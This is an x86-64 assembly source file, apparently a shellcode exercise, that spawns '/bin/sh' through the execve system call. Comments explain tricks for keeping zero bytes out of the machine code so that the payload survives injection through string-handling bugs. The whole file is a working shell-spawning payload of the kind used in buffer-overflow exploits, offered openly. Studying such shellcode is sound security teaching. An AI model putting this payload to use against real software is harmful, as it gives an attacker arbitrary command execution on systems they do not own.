	.text
	.globl _start
_start:
	# set stack pointer and base pointer at start of function
	pushq %rbp
	movq %rsp, %rbp
	
	# set systemcall parameters
	# arg0, file name
	
	# "/bin/sh\0" 0x0068732f6e69622f
	# avoid 0 by right shift
	movq $0x68732f6e69622fff, %rax
	shrq $0x8, %rax
	
	# push file name to stack
	pushq %rax
	
	# set rdi(arg0) to stack pointer
	movq %rsp, %rdi
	
	# arg1 argv, set to 0
	xorq %rsi, %rsi
	
	# arg2 envirment, set to 0
	xorq %rdx, %rdx
	
	# system call id, 0x3b, 1's complement is 0xffffffffffffffc4
	# avoid 0 since mov instruction need 64 bit of immidiate value
	movq $0xffffffffffffffc4, %rax
	notq %rax
	
	# system call 
	syscall
	
	#exit funciton
	leave
	ret
	